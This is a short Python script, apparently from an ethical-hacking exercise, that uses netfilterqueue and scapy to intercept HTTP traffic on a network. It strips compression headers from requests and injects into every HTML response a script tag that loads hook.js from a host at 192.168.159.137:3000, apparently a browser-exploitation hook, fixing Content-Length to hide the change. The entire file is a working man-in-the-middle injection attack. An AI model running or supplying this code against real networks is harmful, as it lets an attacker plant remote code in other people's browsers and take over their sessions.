import netfilterqueue
import scapy.all as scapy
import re

def modify_packet(packet, load):
    packet[scapy.Raw].load = load.encode()
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:
                # injecting_code = "<script>alert('test')</script>"
                injecting_code = "<script src='http://192.168.159.137:3000/hook.js'></script>"
                load = re.sub("</body>", (injecting_code + "</body>"), load)
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = len(injecting_code) + int(content_length)
                    load = re.sub(content_length, str(new_content_length), load)

            if load != scapy_packet[scapy.Raw].load.decode():
                new_packet = modify_packet(scapy_packet, load)
                packet.set_payload(bytes(new_packet))

        except UnicodeDecodeError:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
